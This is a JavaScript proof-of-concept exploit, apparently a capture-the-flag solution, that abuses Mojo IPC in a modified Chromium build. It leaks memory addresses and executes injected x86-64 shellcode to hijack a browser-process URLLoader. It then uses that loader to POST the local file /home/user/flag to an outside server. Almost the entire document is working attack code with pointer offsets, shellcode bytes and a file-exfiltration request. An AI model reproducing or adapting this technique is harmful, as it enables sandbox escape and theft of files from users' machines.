function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let reqUrl = 'http://myserver:1337/1.html';
let req = Object.assign(new network.mojom.URLRequest, {
    method: 'POST',
    url: Object.assign(new url.mojom.Url, {url: reqUrl}),
    siteForCookies: Object.assign({scheme: "http", registrableDomain: "localhost", schemefullySame: true}),
    update_first_party_url_on_redirect: false,
    referrer: Object.assign(new url.mojom.Url, {url: ''}),
    referrer_policy: network.mojom.URLRequestReferrerPolicy.kOrigin,
    headers: Object.assign(new network.mojom.HttpRequestHeaders, {
        headers: [Object.assign(new network.mojom.HttpRequestHeaderKeyValuePair, {
            key: 'Pwned', value: 'XD' })]
    }),
    requestInitiator: Object.assign({
        scheme: "http",
        host: "localhost",
        port: 80
    }),
    corsExemptHeaders: Object.assign(new network.mojom.HttpRequestHeaders, {
        headers: [Object.assign(new network.mojom.HttpRequestHeaderKeyValuePair, {
            key: 'Purpose', value: 'pwn' })] }),
    load_flags: 0,
    resource_type: 0,
    priority: network.mojom.RequestPriority.kMedium,
    should_reset_appcache: false,
    is_external_request: false,
    cors_preflight_policy: network.mojom.CorsPreflightPolicy.kPreventPreflight,
    originated_from_service_worker: false,
    skip_service_worker: false,
    corb_detachable: false,
    corb_excluded: false,
    mode: network.mojom.RequestMode.kNoCors,
    credentials_mode: network.mojom.CredentialsMode.kOmit,
    redirect_mode: network.mojom.RedirectMode.kFollow,
    fetchIntegrity: "topshelf",
    destination: network.mojom.RequestDestination.kDocument,
    requestBody: Object.assign(new network.mojom.URLRequestBody, {
        elements: [Object.assign(new network.mojom.DataElement, {
            type: network.mojom.DataElementType.kFile,
            buf: [0x61, 0x61, 0x61],
            path: Object.assign(new mojoBase.mojom.FilePath, {
                path: "/home/user/flag"
            }),
            offset: 0,
            length: 35,
            expectedModificationTime: Object.assign(new mojoBase.mojom.Time, {
                internalValue: 0,
            })
        })],
        identifier: 0,
        containsSensitiveInfo: false,
    }), keepalive: false,
    has_user_gesture: false,
    enable_load_timing: false,
    enable_upload_progress: false,
    do_not_prompt_for_login: false,
    render_frame_id: 0,
    is_main_frame: false,
    transition_type: 0,
    report_raw_headers: 0,
    previews_state: 0,
    upgrade_if_insecure: false,
    is_revalidating: false,
    is_signed_exchange_prefetch_cache_enabled: false,
    obey_origin_policy: false,
});

let pwnPtr  = new content.mojom.PwnPtr;
let pwnReq  = new mojo.makeRequest(pwnPtr);
Mojo.bindInterface(content.mojom.Pwn.name, pwnReq.handle, "process");

async function ptrAt(ptr) {
    let val = await pwnPtr.ptrAt(ptr).then(val  => { return val.val; });

    // While browser is opening sometimes we encounter nullptrs.
    while (val == 0) {
        val = await pwnPtr.ptrAt(ptr).then(val  => { return val.val; });
        sleep(500);
    }

    return val;
}

async function poc() {

    // Create an UrlLoader with a pending_receiver
    let UrlLoaderPtr = new network.mojom.URLLoaderPtr();
    let UrlLoaderReq = mojo.makeRequest(UrlLoaderPtr);

    // Create an UrlClient with a pending_remote
    let UrlLoaderClientPtr = new network.mojom.URLLoaderClientPtr;
    let UrlLoaderClientReq = mojo.makeRequest(UrlLoaderClientPtr);

    // Get the `this` pointer
    let ptr = await pwnPtr.this().then(ptr       => { return ptr.val; });
    console.log('this:           ' +  ptr.toString(16));

    // Get the `vtable` pointer
    let val1 = await ptrAt(ptr);
    console.log('vtable:         ' + val1.toString(16));

    // Get the first entry in the vtable
    let val2 = await ptrAt(val1);
    console.log('xsltFreeLocale: ' + val2.toString(16));

    // Constant offset from the first vtable entry: xsltFreeLocale
    let MojoGetTimeTicksNowImpl = val2 + 0xa4e040n;
    console.log('MojoGetTimeTicksNowImpl: '
        + MojoGetTimeTicksNowImpl.toString(16));

    // MojoGetTimeTicksNowImpl accesses g_core:
    let g_core_ptr_ptr = MojoGetTimeTicksNowImpl + 0x6ff23e5n + 0xbn;
    console.log('g_core_ptr_ptr: ' + g_core_ptr_ptr.toString(16));
    let g_core_ptr = await ptrAt(g_core_ptr_ptr);
    console.log('g_core_ptr:     ' + g_core_ptr.toString(16));

    // Get the g_system_manager_context
    let g_smc_ptr_ptr       = g_core_ptr_ptr + 0x28820n;
    let g_smc_ptr           = await ptrAt(g_smc_ptr_ptr);
    let g_ulf_ptr           = g_smc_ptr + 0x140n;
    let internal_state_ptr  = g_ulf_ptr;
    console.log('g_smc_ptr:           ' + g_smc_ptr.toString(16));
    console.log('g_ulf_ptr:           ' + g_ulf_ptr.toString(16));
    console.log('internal_state_ptr:  ' + internal_state_ptr.toString(16));

    let endpoint_client_ptr_ptr = internal_state_ptr + 0x08n;
    let endpoint_client_ptr     = await ptrAt(endpoint_client_ptr_ptr);
    console.log('endpoint_client_ptr: ' + endpoint_client_ptr.toString(16));

    let interface_endpoint_contoller_ptr_ptr = endpoint_client_ptr + 0xd0n;

    let interface_endpoint_contoller_ptr =
        await ptrAt(interface_endpoint_contoller_ptr_ptr);
    console.log('interface_endpoint_contoller_ptr: '
        + interface_endpoint_contoller_ptr.toString(16));

    let multiplexrouter_ptr_ptr = interface_endpoint_contoller_ptr + 0x10n;
    let multiplexrouter_ptr     = await ptrAt(multiplexrouter_ptr_ptr);
    console.log('multiplexrouter_ptr: ' + multiplexrouter_ptr.toString(16));

    let connector_ptr        = multiplexrouter_ptr + 0x68n;
    let urlloader_handle_ptr = connector_ptr + 0x10n;
    let urlloader_handle     = await ptrAt(urlloader_handle_ptr) & 0xffffn;
    console.log('connector_ptr:       ' + connector_ptr.toString(16));
    console.log('urlloader_handle:    ' + urlloader_handle.toString(16));

    // Get the handle table
    let handle_table_ptr = g_core_ptr + 0x40n;
    let handle_table = await ptrAt(handle_table_ptr);
    console.log('handle_table: ' + handle_table.toString(16));

    let map_handles_ptr = handle_table + 0x18n;
    let map_handles     = await ptrAt(map_handles_ptr);
    console.log('map_handles: ' + map_handles.toString(16));

    // Dump the handles
    let c = 0;
    let handle = 0;
    let urlloader_entry = 0;
    while (map_handles != 0) {
        // console.log('Entry number: ' + c);
        // console.log('map_handles: ' + map_handles.toString(16));
        c++;

        handle = await ptrAt(map_handles + 0x08n);
        // console.log('handle: ' + handle.toString(16));

        // Found the MessagePipeDispatcher, which includes the port_
        if (handle == urlloader_handle) {
            urlloader_entry = map_handles;
            break;
        }

        map_handles = await ptrAt(map_handles);
    }

    console.log('found urlloader_entry: ' + urlloader_entry.toString(16));

    let dispatch_ptr_ptr = urlloader_entry + 0x18n;
    let dispatch_ptr     = await ptrAt(dispatch_ptr_ptr);

    // The end of the first chapter of our quest.
    let seq_id   = await ptrAt(dispatch_ptr + 0x30n);
    let port_ptr = await ptrAt(dispatch_ptr + 0x28n);
    let port_v1 = await ptrAt(port_ptr + 0x18n);
    let port_v2 = await ptrAt(port_ptr + 0x20n);
    let seq     = await ptrAt(port_ptr + 0x28n);

    console.log('port_v1: ' + port_v1.toString(16));
    console.log('port_v2: ' + port_v2.toString(16));
    console.log('seq_id:  ' + seq_id.toString(16));
    console.log('seq:     ' + seq.toString(16));

    // Now we will patch these port numbers into an UrlLoader in the renderer
    let ab1   = new ArrayBuffer(0x10000);
    let v8_1  = new Uint8Array(ab1);
    let v64_1 = new BigUint64Array(ab1);

    let ab2   = new ArrayBuffer(0x10000);
    let v8_2  = new Uint8Array(ab2);
    let v64_2 = new BigUint64Array(ab2);

    // Get all the handles
    v8_1.set([
        0x56, 0x51, 0x57, 0x48, 0x31, 0xdb, 0x4c, 0x89, 0xf0, 0x48, 0x8b,
        0x78, 0x10, 0x48, 0x8b, 0x3f, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x00,
        0x48, 0x8b, 0x00, 0x48, 0x05, 0x40, 0xe0, 0xa4, 0x00, 0x48, 0x05, 0xe5,
        0x23, 0xff, 0x06, 0x48, 0x83, 0xc0, 0x0b, 0x48, 0x8b, 0x00, 0x48, 0x83,
        0xc0, 0x40, 0x48, 0x8b, 0x00, 0x48, 0x83, 0xc0, 0x18, 0x48, 0x89, 0xfe,
        0x48, 0x81, 0xc6, 0x00, 0x08, 0x00, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x85,
        0xc0, 0x74, 0x13, 0x48, 0xff, 0xc3, 0x48, 0x89, 0xc1, 0x48, 0x83, 0xc1,
        0x08, 0x48, 0x8b, 0x09, 0x48, 0x89, 0x0c, 0xde, 0xeb, 0xe5, 0x48, 0x89,
        0xfe, 0x48, 0x81, 0xc6, 0x00, 0x08, 0x00, 0x00, 0x48, 0x89, 0x1e, 0x5f,
        0x59, 0x5e, 0xc3
    ])
    v8_2.set([
        0x56, 0x51, 0x57, 0x48, 0x31, 0xdb, 0x4c, 0x89, 0xf0, 0x48, 0x8b,
        0x78, 0x10, 0x48, 0x8b, 0x3f, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x00,
        0x48, 0x8b, 0x00, 0x48, 0x05, 0x40, 0xe0, 0xa4, 0x00, 0x48, 0x05, 0xe5,
        0x23, 0xff, 0x06, 0x48, 0x83, 0xc0, 0x0b, 0x48, 0x8b, 0x00, 0x48, 0x83,
        0xc0, 0x40, 0x48, 0x8b, 0x00, 0x48, 0x83, 0xc0, 0x18, 0x48, 0x89, 0xfe,
        0x48, 0x81, 0xc6, 0x00, 0x08, 0x00, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x85,
        0xc0, 0x74, 0x13, 0x48, 0xff, 0xc3, 0x48, 0x89, 0xc1, 0x48, 0x83, 0xc1,
        0x08, 0x48, 0x8b, 0x09, 0x48, 0x89, 0x0c, 0xde, 0xeb, 0xe5, 0x48, 0x89,
        0xfe, 0x48, 0x81, 0xc6, 0x00, 0x08, 0x00, 0x00, 0x48, 0x89, 0x1e, 0x5f,
        0x59, 0x5e, 0xc3
    ])

    let UrlLoaderFactoryPtr = new network.mojom.URLLoaderFactoryPtr();
    Mojo.rce(ab1);
    let UrlLoaderFactoryReq = mojo.makeRequest(UrlLoaderFactoryPtr);
    // Create an UrlLoader and connect it to the browser
    Mojo.bindInterface(network.mojom.URLLoaderFactory.name,
        UrlLoaderFactoryReq.handle, "process");
    Mojo.rce(ab2);

    let c1 = v64_1[0x100];
    let c2 = v64_2[0x100];

    console.log('Before: parsed ' + c1 + ' handles');
    let handles1 = v64_1.slice(0x101, 0x101+parseInt(c1));
    console.log(handles1);

    console.log('After: parsed ' + c2 + ' handles');
    let handles2 = v64_2.slice(0x101, 0x101+parseInt(c2));
    console.log(handles2);

    // Should be one new handler for the remote, sometimes there is two (race)
    // so we just take the lowest
    let diff = handles2.filter(x => !handles1.includes(x));
    console.log(diff);

    let ab3   = new ArrayBuffer(0x10000);
    let v8_3  = new Uint8Array(ab3);
    let v64_3 = new BigUint64Array(ab3);

    v64_3[0x100] = diff[diff.length - 1]; // Lowest is last in the array here
    v64_3[0x101] = seq_id;
    v64_3[0x102] = port_v1;
    v64_3[0x103] = port_v2;
    v64_3[0x104] = seq;

    // Patch in all the required values
    v8_3.set([
        0x56, 0x51, 0x57, 0x52, 0x48, 0x31, 0xdb, 0x4c, 0x89, 0xf0, 0x48, 0x8b,
        0x78, 0x10, 0x48, 0x8b, 0x3f, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x00,
        0x48, 0x8b, 0x00, 0x48, 0x05, 0x40, 0xe0, 0xa4, 0x00, 0x48, 0x05, 0xe5,
        0x23, 0xff, 0x06, 0x48, 0x83, 0xc0, 0x0b, 0x48, 0x8b, 0x00, 0x48, 0x83,
        0xc0, 0x40, 0x48, 0x8b, 0x00, 0x48, 0x83, 0xc0, 0x18, 0x48, 0x89, 0xfe,
        0x48, 0x81, 0xc6, 0x00, 0x08, 0x00, 0x00, 0x48, 0x8b, 0x16, 0x48, 0x8b,
        0x00, 0x48, 0x85, 0xc0, 0x74, 0x4f, 0x48, 0xff, 0xc3, 0x48, 0x89, 0xc1,
        0x48, 0x83, 0xc1, 0x08, 0x48, 0x8b, 0x09, 0x48, 0x39, 0xd1, 0x74, 0x02,
        0xeb, 0xe4, 0x90, 0x48, 0x83, 0xc0, 0x18, 0x48, 0x8b, 0x00, 0x48, 0x83,
        0xc6, 0x08, 0x48, 0x8b, 0x16, 0x48, 0x89, 0x50, 0x30, 0x48, 0x83, 0xc0,
        0x28, 0x48, 0x8b, 0x00, 0x48, 0x83, 0xc6, 0x08, 0x48, 0x8b, 0x16, 0x48,
        0x89, 0x50, 0x18, 0x48, 0x83, 0xc6, 0x08, 0x48, 0x8b, 0x16, 0x48, 0x89,
        0x50, 0x20, 0x48, 0x83, 0xc6, 0x08, 0x48, 0x8b, 0x16, 0x48, 0x89, 0x50,
        0x28, 0x5a, 0x5f, 0x59, 0x5e, 0xc3
    ]);
    Mojo.rce(ab3)

    let mntat = new network.mojom.MutableNetworkTrafficAnnotationTag;

    // Do the request :)
    await UrlLoaderFactoryPtr.createLoaderAndStart(
        UrlLoaderReq,       // pending_receiver<URLLoader> loader,
        0,                  // int32 routing_id,
        0,                  // int32 request_id,
        0,                  // uint32 options,
        req,                // URLRequest request,
        UrlLoaderClientPtr, // pending_remote<URLLoaderClient> client,
        mntat               // MutableNetworkTrafficAnnotationTag traffic_annotation);
    )
}

poc();
